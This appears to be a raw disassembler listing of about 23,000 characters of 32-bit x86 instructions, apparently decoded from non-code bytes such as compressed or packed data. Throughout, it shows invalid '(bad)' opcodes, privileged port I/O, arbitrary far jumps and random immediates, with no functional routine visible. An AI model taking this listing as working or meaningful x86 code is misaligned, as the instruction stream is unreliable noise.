  411ea5:	jb     0x411ee8
  411ea7:	push   cx
  411ea9:	lods   eax,DWORD PTR ds:[esi]
  411eaa:	cld    
  411eab:	mov    ecx,0x26105341
  411eb0:	xor    al,0x34
  411eb2:	pushf  
  411eb3:	fwait
  411eb4:	addr16 push ecx
  411eb6:	adc    ecx,esi
  411eb8:	imul   edx,DWORD PTR [edi-0x2338bd6d],0x1e44ed36
  411ec2:	mov    ds:0x7dee846,eax
  411ec7:	jl     0x411f35
  411ec9:	loopne 0x411e57
  411ecb:	mov    bl,0xec
  411ecd:	sti    
  411ece:	or     al,0x84
  411ed0:	ds inc ebp
  411ed2:	adc    BYTE PTR [edi-0x1d],bl
  411ed5:	mov    ecx,0x64b29d25
  411eda:	repz repnz mov ss,WORD PTR [ecx]
  411ede:	push   0xe5dc1516
  411ee3:	jns    0x411f23
  411ee5:	and    dl,BYTE PTR [edx-0x73]
  411ee8:	cs loope 0x411f02
  411eeb:	jge    0x411f20
  411eed:	cmp    eax,ebx
  411eef:	push   edi
  411ef0:	mov    bh,0xae
  411ef2:	(bad)  
  411ef3:	outs   dx,BYTE PTR ds:[esi]
  411ef4:	xchg   esp,eax
  411ef5:	mov    bl,BYTE PTR [esi+0x6c61338f]
  411efb:	sbb    ebx,ecx
  411efd:	arpl   WORD PTR [ebx+0x1c89b2b0],di
  411f03:	cmp    ebx,esp
  411f05:	mov    dl,0xc0
  411f07:	pop    edx
  411f08:	sbb    edx,ecx
  411f0a:	xchg   DWORD PTR ss:[eax-0x5e],ebx
  411f0e:	xor    eax,0xbc9e7b9
  411f13:	xor    eax,0x231737b9
  411f18:	out    dx,al
  411f19:	jecxz  0x411f07
  411f1b:	(bad)  [eax+ecx*2+0x543b929c]
  411f22:	dec    esi
  411f23:	shl    BYTE PTR [edx-0x6f],0x5
  411f27:	(bad)  
  411f28:	scas   eax,DWORD PTR es:[edi]
  411f29:	push   esp
  411f2a:	test   DWORD PTR [edi],edx
  411f2c:	jmp    0x411f07
  411f2e:	mov    bh,0xee
  411f30:	ss ja  0x411ef8
  411f33:	test   DWORD PTR [edi],ebp
  411f35:	sbb    edi,DWORD PTR [esi+0x7efae418]
  411f3b:	sbb    eax,0x9e58912d
  411f40:	arpl   WORD PTR [ebx+0x645e4b94],bp
  411f46:	fmul   DWORD PTR [edi-0x5b]
  411f49:	jb     0x411f51
  411f4b:	mov    DWORD PTR [ecx-0x3d160d6b],ecx
  411f51:	addps  xmm6,XMMWORD PTR [edx]
  411f54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f55:	pushf  
  411f56:	mov    ecx,0x2bfdfb2c
  411f5b:	lods   eax,DWORD PTR ds:[esi]
  411f5c:	pmaxub mm2,QWORD PTR [esi]
  411f5f:	arpl   WORD PTR [ecx],bp
  411f61:	lods   al,BYTE PTR ds:[esi]
  411f62:	loop   0x411f48
  411f64:	xor    BYTE PTR ds:0x524c131f,bh
  411f6a:	dec    ebp
  411f6b:	push   esp
  411f6c:	(bad)
  411f70:	jmp    0x57d72db0
  411f75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f76:	mov    esi,0x989b30e1
  411f7b:	jmp    0x411fb0
  411f7d:	mov    esp,0x8ba95d5c
  411f82:	inc    ecx
  411f83:	mov    bh,0x67
  411f85:	rcr    eax,1
  411f87:	jmp    0x6b74:0xd5e9a832
  411f8e:	popa   
  411f8f:	sar    BYTE PTR [ecx-0x219135b3],1
  411f95:	in     al,0xca
  411f97:	fld    TBYTE PTR [eax+0x49]
  411f9a:	imul   ebx,DWORD PTR [ecx+eiz*8+0x7],0xd0e1a507
  411fa2:	cmp    ecx,esi
  411fa4:	lea    esp,[esi]
  411fa6:	inc    eax
  411fa7:	jge    0x411fee
  411fa9:	xchg   edx,eax
  411faa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fab:	shl    BYTE PTR [eax],cl
  411fad:	push   ebp
  411fae:	int    0x8d
  411fb0:	sub    DWORD PTR ds:[eax+0x4a44696f],ebx
  411fb7:	push   eax
  411fb8:	add    BYTE PTR [edi+ecx*4],ch
  411fbb:	mov    eax,ds:0x768e6bd4
  411fc0:	push   DWORD PTR [edx-0x3c]
  411fc3:	mov    ebp,0x90640f52
  411fc8:	mov    WORD PTR [edx+0x7276f30d],ss
  411fce:	jecxz  0x412021
  411fd0:	mov    ds,WORD PTR [edi-0x55]
  411fd3:	(bad)  
  411fd4:	ret    
  411fd5:	mov    dl,0xe8
  411fd7:	push   es
  411fd8:	push   ecx
  411fd9:	cmp    dl,0x2c
  411fdc:	test   ebx,eax
  411fde:	or     edx,DWORD PTR [ebp-0x39]
  411fe1:	mov    BYTE PTR [edi+0x3],ah
  411fe4:	cmp    eax,0x1a9c933c
  411fe9:	cmp    DWORD PTR [ecx+eax*8-0x28c708f3],ebp
  411ff0:	mov    esi,0xb45dcb6c
  411ff5:	mov    ebp,ss
  411ff7:	pop    ebx
  411ff8:	lock or bh,bl
  411ffb:	or     eax,0x91cf343e
  412000:	dec    edx
  412001:	jmp    0x411fde
  412003:	push   edi
  412004:	xor    al,0xb6
  412006:	cmp    eax,0x6e9733a
  41200b:	das    
  41200c:	xchg   DWORD PTR [esi-0x37b7979b],ecx
  412012:	xchg   DWORD PTR [edx],ebx
  412014:	ins    DWORD PTR es:[edi],dx
  412015:	stos   DWORD PTR es:[edi],eax
  412016:	mov    eax,ebx
  412018:	dec    esp
  412019:	push   ss
  41201a:	fs pop es
  41201c:	test   BYTE PTR [edx+0x3f],al
  41201f:	mov    esp,0xbf8aeeb1
  412024:	sub    BYTE PTR [ebp-0x32],bh
  412027:	mov    bh,0x56
  412029:	mov    cl,0xe7
  41202b:	scas   al,BYTE PTR es:[edi]
  41202c:	nop
  41202d:	push   edi
  41202e:	fs pop ebx
  412030:	retf   0x5e70
  412033:	xor    DWORD PTR [ebx],esp
  412035:	stc    
  412036:	sbb    eax,0xfa04f521
  41203b:	or     ch,BYTE PTR [ebx-0xb8caa6b]
  412041:	mov    dh,BYTE PTR [ebp+0x38]
  412044:	les    eax,FWORD PTR [ecx]
  412046:	sbb    esp,DWORD PTR [edi]
  412048:	and    BYTE PTR [edi+0x4fd7862b],dh
  41204e:	(bad)  
  41204f:	xchg   edx,eax
  412050:	(bad)  
  412051:	pusha  
  412052:	mov    al,0xa5
  412054:	cmp    eax,0x7e578f9f
  412059:	shr    al,1
  41205b:	lock sub esi,DWORD PTR [esi]
  41205e:	sub    al,0xf
  412060:	or     dh,bh
  412062:	test   bl,dl
  412064:	imul   ebx,DWORD PTR [eax-0x10],0xb6c1a0f8
  41206b:	loopne 0x41204c
  41206d:	in     eax,dx
  41206e:	test   DWORD PTR [ebx-0x72088761],ebp
  412074:	pop    edi
  412075:	inc    esi
  412076:	rcl    DWORD PTR [edx-0x12],0xe3
  41207a:	sbb    al,BYTE PTR [esi+0x7]
  41207d:	push   cs
  41207e:	jp     0x4120b2
  412080:	mov    ?,esi
  412082:	mov    bl,0x23
  412084:	xchg   esp,eax
  412085:	cmp    eax,0xccaaf7df
  41208a:	in     eax,dx
  41208b:	push   edx
  41208c:	loop   0x412086
  41208e:	je     0x412096
  412090:	push   edx
  412091:	outs   dx,DWORD PTR ds:[esi]
  412092:	fnstenv [eax+edi*4+0x69ae512f]
  412099:	mov    ebp,0x16f190ba
  41209e:	xchg   BYTE PTR [esi+0x38],ah
  4120a1:	cmp    DWORD PTR [ecx+0x1d05bd0e],edx
  4120a7:	push   eax
  4120a8:	scas   eax,DWORD PTR es:[edi]
  4120a9:	mov    dl,0xd4
  4120ab:	xchg   esi,eax
  4120ac:	fbld   TBYTE PTR [ebp+ecx*8-0xb]
  4120b0:	pop    edi
  4120b1:	mov    cl,0xfc
  4120b3:	arpl   WORD PTR ds:0x788614cc,di
  4120b9:	mov    bl,0xf6
  4120bb:	sti    
  4120bc:	dec    eax
  4120bd:	cmc    
  4120be:	out    dx,al
  4120bf:	ins    DWORD PTR es:[edi],dx
  4120c0:	or     al,dh
  4120c2:	xlat   BYTE PTR ds:[ebx]
  4120c3:	xchg   BYTE PTR [ebp-0xb],al
  4120c6:	outs   dx,BYTE PTR ds:[esi]
  4120c7:	js     0x4120c8
  4120c9:	mov    al,bh
  4120cb:	and    bl,BYTE PTR [ebx+0x23]
  4120ce:	sbb    edx,ecx
  4120d0:	jecxz  0x412114
  4120d2:	dec    ebp
  4120d3:	fld    QWORD PTR [eax+0x65]
  4120d6:	(bad)  
  4120d8:	xchg   esp,eax
  4120d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120da:	jmp    0x4120b6
  4120dc:	stc    
  4120dd:	mov    WORD PTR [esi],cs
  4120df:	push   es
  4120e0:	jno    0x412082
  4120e2:	jae    0x4120a2
  4120e4:	sbb    al,0xcd
  4120e6:	scas   al,BYTE PTR es:[edi]
  4120e7:	cmp    al,0xec
  4120e9:	jb     0x4120a9
  4120eb:	aas    
  4120ec:	call   0x8cf03b01
  4120f1:	or     DWORD PTR [ecx+0x3c9bd2c1],edi
  4120f7:	mov    ah,0xcf
  4120f9:	jns    0x4120cf
  4120fb:	mov    bl,bl
  4120fd:	mov    bl,0xfb
  4120ff:	and    eax,0x42ae09a9
  412104:	popf   
  412105:	das    
  412106:	ss dec edi
  412108:	(bad)  
  412109:	push   cs
  41210a:	repnz sahf 
  41210c:	call   DWORD PTR [ebp-0x56]
  41210f:	out    dx,al
  412110:	in     al,dx
  412111:	fwait
  412112:	popf   
  412113:	out    0x86,eax
  412115:	aas    
  412116:	outs   dx,BYTE PTR ds:[esi]
  412117:	shl    ch,1
  412119:	(bad)  
  41211a:	ins    BYTE PTR es:[edi],dx
  41211b:	fiadd  DWORD PTR [edi-0x49]
  41211e:	sub    BYTE PTR [esi],0xa8
  412121:	inc    BYTE PTR [ebp+0x3c0f5523]
  412127:	jns    0x4120cb
  412129:	or     DWORD PTR [edx-0x80],eax
  41212c:	in     al,0x44
  41212e:	dec    ebx
  41212f:	push   esp
  412130:	xchg   eax,edx
  412132:	int3   
  412133:	add    eax,esi
  412135:	xchg   edi,eax
  412136:	retf   0x46e
  412139:	mov    ah,0xf9
  41213b:	sbb    BYTE PTR [ebx+0x1a],dl
  41213e:	in     al,dx
  41213f:	in     al,0x3c
  412141:	pop    ss
  412142:	and    DWORD PTR [ebp-0x7e],esp
  412145:	(bad)  
  412147:	dec    ecx
  412148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412149:	and    BYTE PTR [esi+0x4],al
  41214c:	daa    
  41214d:	cmc    
  41214e:	sbb    eax,0xf5f291ac
  412153:	imul   eax,DWORD PTR [ebx-0xd199c6a],0xd88acf05
  41215d:	cdq    
  41215e:	(bad)  
  41215f:	loope  0x412189
  412161:	or     al,0x45
  412163:	les    eax,FWORD PTR [edx]
  412165:	fiadd  WORD PTR [edi+0x6e70a90e]
  41216b:	pop    esi
  41216c:	adc    ah,BYTE PTR [eax-0x2ba4aac0]
  412172:	imul   eax,DWORD PTR [eax],0x6c
  412175:	adc    dl,0x99
  412178:	sar    DWORD PTR [ebp-0x2a138cec],1
  41217e:	mov    edi,0x55612de3
  412183:	daa    
  412184:	out    0x10,al
  412186:	jle    0x412203
  412188:	fimul  WORD PTR [edi+edx*1+0x65]
  41218c:	outs   dx,BYTE PTR ds:[esi]
  41218d:	leave  
  41218e:	dec    edx
  41218f:	das    
  412190:	sti    
  412191:	jp     0x4121b1
  412193:	push   ebp
  412194:	sti    
  412195:	jne    0x412163
  412197:	in     al,0x36
  412199:	outs   dx,DWORD PTR ds:[esi]
  41219a:	pop    ebx
  41219b:	dec    ecx
  41219c:	sub    al,0x87
  41219e:	xchg   ecx,eax
  41219f:	or     ecx,DWORD PTR [ebx]
  4121a1:	or     eax,0x57fd6471
  4121a6:	arpl   WORD PTR [edx+0x698e3624],di
  4121ac:	xchg   DWORD PTR [eax+0x7],ebx
  4121af:	retf   
  4121b0:	mov    ebx,0x40191497
  4121b5:	mov    BYTE PTR ds:0x5fb39723,dl
  4121bb:	jbe    0x412160
  4121bd:	loopne 0x412182
  4121bf:	fild   QWORD PTR [esi]
  4121c1:	retf   0x3b6e
  4121c4:	inc    edi
  4121c5:	nop
  4121c6:	es jnp 0x41217b
  4121c9:	cmp    BYTE PTR [edx-0x3e],dl
  4121cc:	pop    es
  4121cd:	in     eax,dx
  4121ce:	push   0x6e
  4121d0:	imul   edx,DWORD PTR [ebp+0x13],0x4a38f68c
  4121d7:	jmp    0xb143:0x7b9708fa
  4121de:	loop   0x41216b
  4121e0:	les    ecx,FWORD PTR [edi]
  4121e2:	xchg   ecx,eax
  4121e3:	inc    ecx
  4121e4:	enter  0x717d,0x2a
  4121e8:	fst    QWORD PTR [eax]
  4121ea:	sbb    esi,DWORD PTR [ecx-0x80]
  4121ed:	inc    ecx
  4121ee:	adc    al,0x46
  4121f0:	out    0xac,al
  4121f2:	jne    0x4121e8
  4121f4:	enter  0x822,0x12
  4121f8:	push   cs
  4121f9:	cmp    WORD PTR [edi+0x2a5e7c9a],di
  412200:	add    BYTE PTR [ebx-0x5998b043],dl
  412206:	clc    
  412207:	push   esp
  412208:	int3   
  412209:	mov    dl,0x0
  41220b:	xchg   edi,eax
  41220c:	sub    BYTE PTR [eax],dh
  41220e:	es push eax
  412210:	mov    esp,0x86e6671e
  412215:	add    BYTE PTR [ebx-0x539ffd46],dh
  41221b:	dec    edi
  41221c:	pop    edx
  41221d:	pop    ss
  41221e:	push   edx
  41221f:	add    BYTE PTR [esp+eax*4-0x10b3d6f2],ah
  412226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412227:	jno    0x412250
  412229:	xchg   ebp,eax
  41222a:	sub    ebp,DWORD PTR [edi+0x470934a0]
  412230:	lods   al,BYTE PTR ds:[esi]
  412231:	iret   
  412232:	sbb    ebx,DWORD PTR [edx-0x443bb684]
  412238:	and    eax,0xe3b3767a
  41223d:	or     ecx,eax
  41223f:	xchg   DWORD PTR [edi-0x33fd4d8d],esp
  412245:	adc    BYTE PTR [ebx],cl
  412247:	fisttp QWORD PTR [edx+0x73]
  41224a:	mov    bh,0xdb
  41224c:	sahf   
  41224d:	stos   BYTE PTR es:[edi],al
  41224e:	xchg   esp,eax
  41224f:	mov    ebx,0x8208894e
  412254:	popa   
  412255:	test   eax,0xfb2cec06
  41225a:	rcl    dh,0x30
  41225d:	jmp    0xd3450fe9
  412262:	mov    edi,0x661af867
  412267:	mov    eax,ds:0xa045cdb0
  41226c:	das    
  41226d:	or     bl,ch
  41226f:	mov    edx,0x413b8a67
  412274:	sub    ebp,edx
  412276:	cmp    dh,ch
  412278:	sahf   
  412279:	mov    ah,0x17
  41227b:	fimul  WORD PTR [edi-0x5d]
  41227e:	push   edx
  41227f:	cwde   
  412280:	jns    0x4122ff
  412282:	aaa    
  412283:	jle    0x4122f6
  412285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412286:	cwde   
  412287:	mov    esi,0xc2247131
  41228c:	mov    ecx,0xa4b766d7
  412291:	mov    ch,0x8d
  412293:	mov    bl,BYTE PTR [ebp+0x0]
  412296:	mov    al,gs:0x9a091846
  41229c:	mov    ss,esi
  41229e:	xor    dl,cl
  4122a0:	ret    0xd8d9
  4122a3:	stos   BYTE PTR es:[edi],al
  4122a4:	sub    al,0x0
  4122a6:	aas    
  4122a7:	nop
  4122a8:	inc    esi
  4122a9:	fistp  WORD PTR [esi]
  4122ab:	je     0x412249
  4122ad:	mov    edi,0x36234bf9
  4122b2:	(bad)  
  4122b3:	cs jno 0x412301
  4122b6:	jg     0x4122e3
  4122b8:	push   edx
  4122b9:	cmp    esp,edi
  4122bb:	mov    cl,0x93
  4122bd:	pushf  
  4122be:	(bad)  
  4122bf:	ss scas al,BYTE PTR es:[edi]
  4122c1:	push   ss
  4122c2:	cmc    
  4122c3:	ds adc al,al
  4122c6:	ret    0x96c0
  4122c9:	mov    al,ah
  4122cb:	push   cs
  4122cc:	push   0xf188d4af
  4122d1:	pop    esi
  4122d2:	jno    0x4122a3
  4122d4:	retf   
  4122d5:	jbe    0x41230a
  4122d7:	ret    0x27e1
  4122da:	adc    al,0x6d
  4122dc:	sub    esi,DWORD PTR [edi-0x47ad1e36]
  4122e2:	push   edi
  4122e3:	inc    ecx
  4122e4:	xor    DWORD PTR [edx],esi
  4122e6:	pop    ebx
  4122e7:	mov    bl,0x3e
  4122e9:	aam    0x3
  4122eb:	cmp    BYTE PTR [edx+0x55],ah
  4122ee:	push   0xe6a25791
  4122f3:	enter  0x5ad7,0x6b
  4122f7:	adc    al,BYTE PTR [esi-0x5a]
  4122fa:	fwait
  4122fb:	jb     0x4122e0
  4122fd:	pop    edx
  4122fe:	dec    eax
  4122ff:	xchg   esp,eax
  412300:	dec    ebx
  412301:	lods   eax,DWORD PTR ds:[esi]
  412302:	pusha  
  412303:	arpl   WORD PTR [edx],bp
  412305:	or     dl,dl
  412307:	or     eax,0x4e5caa7
  41230c:	stos   DWORD PTR es:[edi],eax
  41230d:	bound  edx,QWORD PTR [edx]
  41230f:	arpl   WORD PTR [edi],ax
  412311:	and    al,0xb0
  412313:	out    dx,al
  412314:	inc    esi
  412315:	sbb    ebx,DWORD PTR [ecx]
  412317:	xchg   BYTE PTR [ebx+0x1d],dh
  41231a:	pmaxub mm0,QWORD PTR fs:[edi-0x6a2d7948]
  412322:	jmp    0x9c5f15e0
  412327:	pop    ecx
  412328:	(bad)  
  412329:	mov    eax,ds:0x12907352
  41232e:	ror    esp,1
  412330:	lahf   
  412331:	inc    ebp
  412332:	jno    0x412345
  412334:	fadd   QWORD PTR [edx+0x9640543]
  41233a:	cli    
  41233b:	scas   al,BYTE PTR es:[edi]
  41233c:	and    eax,0x27296e4f
  412341:	hlt    
  412342:	inc    esp
  412343:	stos   DWORD PTR es:[edi],eax
  412344:	outs   dx,DWORD PTR ds:[esi]
  412345:	bound  ecx,QWORD PTR [esi]
  412347:	es mov al,0xe7
  41234a:	pop    ecx
  41234b:	dec    ebp
  41234c:	out    dx,al
  41234d:	xchg   esp,eax
  41234e:	aad    0xab
  412350:	imul   esi,DWORD PTR [ebx+0x4d],0xfbc19771
  412357:	mov    eax,ds:0x27984cfb
  41235c:	repz jmp 0x5d064a03
  412362:	mov    eax,ds:0x2f04202e
  412367:	mov    cl,0x9e
  412369:	fs retf 
  41236b:	hlt    
  41236c:	jbe    0x41232d
  41236e:	push   edi
  41236f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412370:	into   
  412371:	aas    
  412372:	dec    esi
  412373:	call   0xc8eb:0xca7dff10
  41237a:	pop    ss
  41237b:	adc    BYTE PTR [esi+0x2ef9698f],bl
  412381:	xchg   edi,eax
  412382:	js     0x41238d
  412384:	pavgw  mm3,mm6
  412387:	xchg   BYTE PTR [eax+0x73b02865],cl
  41238d:	cmp    BYTE PTR [ecx],0x8d
  412390:	arpl   WORD PTR [eax+0x43],dx
  412393:	not    DWORD PTR [esi+eiz*1+0x67a68002]
  41239a:	inc    al
  41239c:	das    
  41239d:	inc    esi
  41239e:	(bad)  
  41239f:	cli    
  4123a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123a1:	ss lahf 
  4123a3:	(bad)  
  4123a4:	popa   
  4123a5:	and    al,0xc4
  4123a7:	(bad)  
  4123a8:	shl    DWORD PTR [eax+0x307aa097],cl
  4123ae:	xor    esi,ebx
  4123b0:	neg    eax
  4123b2:	mov    dl,0xb
  4123b4:	ss or  al,0xd6
  4123b7:	cmpxchg DWORD PTR [edi-0x5d8006db],edx
  4123be:	sar    DWORD PTR [ecx+0x12],0xcc
  4123c2:	loope  0x4123fa
  4123c4:	inc    eax
  4123c5:	imul   eax,DWORD PTR [esi+0x79],0x17
  4123c9:	lods   al,BYTE PTR ds:[esi]
  4123ca:	fnstcw WORD PTR [esi+0x38]
  4123cd:	mov    WORD PTR [edi],es
  4123cf:	adc    dl,BYTE PTR [ebp+0x175f4b0d]
  4123d5:	jb     0x41241e
  4123d7:	adc    cl,BYTE PTR [ebx]
  4123d9:	fimul  WORD PTR [eax-0x5d]
  4123dc:	push   edi
  4123dd:	xor    esi,DWORD PTR [ebp-0x2747481]
  4123e3:	(bad)  
  4123e4:	jnp    0x4123cc
  4123e6:	mov    bl,BYTE PTR [ebx]
  4123e8:	or     BYTE PTR [edx],0xf6
  4123eb:	sub    bh,dl
  4123ed:	sub    eax,0xcf41f528
  4123f2:	jae    0x4123f2
  4123f4:	stos   DWORD PTR es:[edi],eax
  4123f5:	push   edx
  4123f6:	dec    ebp
  4123f7:	pop    esi
  4123f8:	push   ebp
  4123f9:	mov    ebx,ebp
  4123fb:	inc    eax
  4123fc:	pop    esp
  4123fd:	pusha  
  4123fe:	sahf   
  4123ff:	in     eax,0x6e
  412401:	rcr    DWORD PTR [edx],cl
  412403:	jge    0x412405
  412405:	out    0x5f,eax
  412407:	add    ebp,0xcdd33b0
  41240d:	adc    bl,BYTE PTR [ebx+ebx*4+0x662eee8f]
  412414:	(bad)  
  412415:	iret   
  412416:	int    0x29
  412418:	jmp    DWORD PTR es:[ecx]
  41241b:	js     0x4123d9
  41241d:	dec    esp
  41241e:	jmp    0x41248b
  412420:	mov    al,ds:0xe97d0700
  412425:	sbb    edi,edi
  412427:	jmp    0x3a65:0x3a24ab39
  41242e:	xor    dh,BYTE PTR [eax+0x5d6ac183]
  412434:	pop    ds
  412435:	sub    BYTE PTR [edi+0x10],dl
  412438:	push   esi
  412439:	call   0x5d68a03a
  41243e:	push   esp
  41243f:	pop    eax
  412440:	adc    al,0x16
  412442:	dec    edi
  412443:	lock daa 
  412445:	sti    
  412446:	push   ds
  412447:	jmp    0x8b60:0xa6d71e6a
  41244e:	jo     0x412431
  412450:	sbb    BYTE PTR [eax],0x73
  412453:	or     esp,DWORD PTR [esi+0x21]
  412456:	pop    edx
  412457:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412458:	stc    
  412459:	mov    ds,WORD PTR [esi]
  41245b:	dec    esp
  41245c:	fild   DWORD PTR ds:[ebp+0x818734c]
  412463:	dec    ebx
  412464:	mov    BYTE PTR [ecx-0x5a],bh
  412467:	xchg   edi,eax
  412468:	or     ah,BYTE PTR [esi-0x2398533a]
  41246e:	sub    DWORD PTR [ebx+0x43ad56d6],esi
  412474:	sbb    dl,al
  412476:	jbe    0x412493
  412478:	not    BYTE PTR ds:0xb431e1a6
  41247e:	jo     0x41244d
  412480:	pop    ebx
  412481:	shl    DWORD PTR [ebx-0x4375ffe1],cl
  412487:	sbb    al,0xcb
  412489:	sub    ebx,DWORD PTR [eax+0x52]
  41248c:	mov    ebx,0x37f4f5d
  412491:	dec    ebx
  412492:	and    eax,eax
  412494:	pushf  
  412495:	mov    ebx,0x73e39087
  41249a:	sbb    dl,BYTE PTR [ebp-0xe]
  41249d:	jo     0x412467
  41249f:	aas    
  4124a0:	push   edi
  4124a1:	xor    eax,0xfb20c199
  4124a6:	dec    ecx
  4124a7:	test   al,0xd8
  4124a9:	ds jmp 0x1059:0xa94264ae
  4124b1:	mov    al,ds:0x2935b18e
  4124b6:	mov    edi,0x56e5fcb7
  4124bb:	stos   BYTE PTR es:[edi],al
  4124bc:	push   ebx
  4124bd:	dec    esp
  4124be:	shl    edx,1
  4124c0:	cs pop ds
  4124c2:	pop    ds
  4124c3:	mov    ecx,0x3adef5b5
  4124c8:	pop    esi
  4124c9:	or     eax,0xebf67eb9
  4124ce:	cld    
  4124cf:	in     eax,0xe3
  4124d1:	arpl   WORD PTR [ecx+0x11011c87],sp
  4124d7:	sbb    ebx,DWORD PTR [ecx-0x3516fdb8]
  4124dd:	cmp    dh,al
  4124df:	imul   ecx,DWORD PTR [ebx-0x34],0x126ce320
  4124e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124e7:	fs dec ecx
  4124e9:	mov    DWORD PTR [ecx+0x6],esi
  4124ec:	pop    es
  4124ed:	push   es
  4124ee:	sbb    eax,0x8bd31703
  4124f3:	pop    esp
  4124f4:	push   cs
  4124f5:	aad    0x77
  4124f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124f8:	daa    
  4124f9:	pop    ecx
  4124fa:	fwait
  4124fb:	out    dx,eax
  4124fc:	jne    0x412565
  4124fe:	jbe    0x412531
  412500:	outs   dx,BYTE PTR ds:[esi]
  412501:	in     eax,0x76
  412503:	scas   al,BYTE PTR es:[edi]
  412504:	mov    ebx,0x3db0a952
  412509:	xor    al,0x46
  41250b:	jmp    0x76e5:0xfc0b0813
  412512:	cs clc 
  412514:	mov    esi,0xc267e10d
  412519:	or     BYTE PTR [eax-0x13],ch
  41251c:	cs cmp eax,0xfc6cf937
  412522:	mov    bl,0xa7
  412524:	sub    eax,DWORD PTR [ecx]
  412526:	lods   eax,DWORD PTR ds:[esi]
  412527:	cmp    edx,DWORD PTR [ebx-0x304f36aa]
  41252d:	jae    0x4124cb
  41252f:	fs jmp 0x4a04:0x56928b0c
  412537:	dec    DWORD PTR [edi]
  412539:	inc    edi
  41253a:	ins    DWORD PTR es:[edi],dx
  41253b:	xlat   BYTE PTR ds:[ebx]
  41253c:	dec    ebp
  41253d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41253f:	repz in eax,0xbb
  412542:	inc    DWORD PTR [eax+0x7ef649c3]
  412548:	test   eax,0x46abe6eb
  41254d:	mov    al,0x6
  41254f:	ins    DWORD PTR es:[edi],dx
  412550:	cmp    ebp,DWORD PTR [ebx]
  412552:	push   eax
  412553:	and    al,bl
  412555:	add    dh,bh
  412557:	das    
  412558:	test   eax,0x86a5854d
  41255d:	mov    bl,0xe2
  41255f:	popa   
  412560:	fisttp QWORD PTR [esi+edi*4]
  412563:	dec    esp
  412564:	xchg   ah,al
  412566:	ficom  WORD PTR [eax+0x2cfc2f5f]
  41256c:	adc    BYTE PTR [ecx],ah
  41256e:	jge    0x4125d8
  412570:	js     0x41254d
  412572:	xchg   ebp,eax
  412573:	xchg   edi,eax
  412574:	loopne 0x41254f
  412576:	inc    DWORD PTR [esi+0x709af5a5]
  41257c:	jb     0x412514
  41257e:	pusha  
  41257f:	mov    edi,ecx
  412581:	inc    ebx
  412582:	and    al,BYTE PTR [edx+eax*4-0x69989036]
  412589:	fsub   QWORD PTR [eax-0x3c]
  41258c:	adc    ebx,DWORD PTR [eax-0x4d0da2f5]
  412592:	adc    BYTE PTR [edx],ah
  412594:	iret   
  412595:	into   
  412596:	dec    esi
  412597:	lds    ecx,FWORD PTR [edx+0x4baed559]
  41259d:	lahf   
  41259e:	inc    eax
  41259f:	out    0x2a,al
  4125a1:	xchg   ebx,eax
  4125a2:	inc    eax
  4125a3:	lock add esi,DWORD PTR [edi-0x218206c1]
  4125aa:	dec    eax
  4125ab:	jl     0x412606
  4125ad:	sbb    DWORD PTR [esi+0x5da32b60],edi
  4125b3:	and    al,BYTE PTR [edx]
  4125b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125b6:	into   
  4125b7:	jecxz  0x4125d3
  4125b9:	mov    ds,ebx
  4125bb:	(bad)  
  4125bc:	push   ds
  4125bd:	add    al,0xc2
  4125bf:	lahf   
  4125c0:	loopne 0x412562
  4125c2:	imul   ebp,DWORD PTR [eax+0x20],0x6
  4125c6:	mov    al,ds:0x34f2d5e0
  4125cb:	neg    BYTE PTR [edx-0x21c93d04]
  4125d1:	int3   
  4125d2:	lahf   
  4125d3:	sub    eax,0x98952891
  4125d8:	mov    ecx,0x6ee5d635
  4125dd:	sbb    eax,0xe3c3de19
  4125e2:	mov    ecx,0x7cf0b652
  4125e7:	loopne 0x412656
  4125e9:	mov    ds:0xae3cd8bc,eax
  4125ee:	pusha  
  4125ef:	mov    al,0x72
  4125f1:	je     0x4125fe
  4125f3:	jge    0x412627
  4125f5:	test   edi,esp
  4125f7:	push   ss
  4125f8:	or     ebx,DWORD PTR [ecx-0x55]
  4125fb:	aad    0x7
  4125fd:	cdq    
  4125fe:	cmp    DWORD PTR ds:0x39adfc72,ebp
  412604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412605:	fist   DWORD PTR [esi+esi*4-0x13]
  412609:	mov    DWORD PTR [edi-0x1c],ebx
  41260c:	mov    WORD PTR [edi+ebx*8-0x4a],ds
  412610:	lods   al,BYTE PTR ds:[esi]
  412611:	aas    
  412612:	mov    ds:0xff76092e,al
  412617:	ds sti 
  412619:	pop    ebp
  41261a:	and    edx,0xffffff82
  41261d:	add    BYTE PTR [ebp-0x66fa9dd9],0xd3
  412624:	push   ebx
  412625:	sub    DWORD PTR [esi+eiz*1],ebp
  412628:	pop    esp
  412629:	add    al,0xb9
  41262b:	lods   eax,DWORD PTR ds:[esi]
  41262c:	stos   DWORD PTR es:[edi],eax
  41262d:	gs xchg edx,eax
  41262f:	mov    edi,0x6c515654
  412634:	xchg   edi,eax
  412635:	call   0xdccc:0xa80554b3
  41263c:	jmp    0x3565cab1
  412641:	sub    DWORD PTR [eax-0xb],0x78
  412645:	sub    ch,BYTE PTR [edi-0x66925492]
  41264b:	repnz pop ss
  41264d:	gs mov cl,0xea
  412650:	lock sub al,0x64
  412653:	add    BYTE PTR [ebp+0x6],cl
  412656:	fwait
  412657:	mov    ebx,0x8e8b2e51
  41265c:	and    BYTE PTR [edx],0x54
  41265f:	xchg   edi,eax
  412660:	adc    esp,eax
  412662:	arpl   WORD PTR [edx],cx
  412664:	call   0x282d9ad9
  412669:	and    al,0x12
  41266b:	or     BYTE PTR [eax-0x7c],bh
  41266e:	into   
  41266f:	into   
  412670:	xor    BYTE PTR [ebx+0x5b],cl
  412673:	jle    0x4126a2
  412675:	pushf  
  412676:	dec    edx
